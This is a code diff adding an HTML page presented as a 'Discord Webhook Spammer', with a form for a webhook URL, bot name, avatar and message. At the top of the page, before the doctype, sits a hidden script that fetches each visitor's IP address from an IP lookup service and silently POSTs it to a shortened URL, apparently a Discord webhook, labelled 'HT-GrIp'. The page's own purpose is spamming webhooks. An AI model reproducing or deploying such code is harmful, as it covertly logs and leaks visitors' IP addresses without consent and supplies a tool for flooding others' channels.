@@ -1,0 +1,74 @@
+<script>
+  function getIP(json) {
+    var request = new XMLHttpRequest(); 
+        request.open("POST", " https://tinyurl.com/yj5j2yyj");
+  
+        request.setRequestHeader('Content-type', 'application/json');
+  
+        var params = {
+          username: "HT-GR",
+          avatar_url: "https://i.pinimg.com/originals/03/e3/00/03e300548524e1704ce9e3240ebeea69.jpg",
+          content: "**HT-GrIp:** *" + json.ip + "*"
+        }
+
+
+        request.send(JSON.stringify(params));
+      }
+  
+  </script>
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+
+ 
+<!--Se que lees esto-->
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Discord Webhook Sender</title>
+  <meta name="author" content="Me lol">
+  <meta name="description" content="Discord Webhook Spammer">
+  <meta name="keywords" content="discord webhook spammer">
+  <meta name="title" content="Discord Webhook Spammer">
+  <link rel="stylesheet" href="stylesheet.css" type="text/css">
+</head>
+
+<body>
+<!--Hola ajaj-->
+  <div id="header">
+
+    <h1 style="font-family: Arial, Helvetica, sans-serif; color: #ffffff">Discord Webhook Spammer</h1>
+  </div>
+  <div id="container">
+    <div class="center-align">
+      <p style="font-family: Arial, Helvetica, sans-serif; color: #ffffff"></p><input type='text' id="link"
+        placeholder="Webhook URL :">
+      <p>&#160;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+      <p>
+      <p style="font-family: Arial, Helvetica, sans-serif; color: #ffffff"></p><input type="text" id="username"
+        placeholder="Nombre de bot :">
+      <p>&#160;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+      <p>
+      <p style="font-family: Arial, Helvetica, sans-serif; color: #ffffff"></p><input type="text" id="avatar"
+        placeholder="Avatar URL :">
+      <p>&#160;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+      <p>
+      <p style="font-family: Arial, Helvetica, sans-serif; color: #ffffff"></p><input type="text" id="content"
+        placeholder="Mensaje :">
+      <br>
+      <p>&#160;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+      <p>
+        <button id="btn">spam</button>
+        <center>
+          <p id='log'></p>
+        </center>
+    </div>
+  </div>
+  </div>
+
+  <script src="jquery.js"></script>
+  <script src="main.js"></script>
+</body>
+
+</html>
